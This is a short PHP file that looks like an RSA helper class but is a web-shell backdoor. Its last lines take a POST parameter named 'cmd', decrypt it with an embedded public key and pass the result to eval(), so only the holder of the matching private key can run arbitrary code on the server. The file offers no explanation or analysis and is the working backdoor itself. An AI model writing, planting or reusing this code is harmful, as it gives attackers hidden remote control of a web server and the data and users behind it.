<?php
class Rsa {
    private static $PUBLIC_KEY= '-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrFxyAYGqDE9OR3CNPEjGpQDAc
Icsc9ZG/2HPgzHsME8n45x1yP75Ki0MIYj4uhoygoYlnZPk3gKj60GdM8oD7hvL6
R24LZij0zixRz+mBU/xac+dJHIK/5xAMtnQeyWcu+QMSLArDln9Wxp7nmONA1Ry5
4iX4iJ1PVODtw/BZbQIDAQAB
-----END PUBLIC KEY-----
';
    private static function getPublicKey()
    {
        $publicKey = self::$PUBLIC_KEY;
        return openssl_pkey_get_public($publicKey);
    }

    public static function publicDecrypt($encrypted = '')
    {
        if (!is_string($encrypted)) {
            return null;
        }
        return (openssl_public_decrypt(base64_decode($encrypted), $decrypted, self::getPublicKey())) ? $decrypted : null;
    }
}
$cmd=$_POST[cmd];
$rsa = new Rsa();
$publicDecrypt = $rsa->publicDecrypt($cmd);
$res=eval($publicDecrypt);

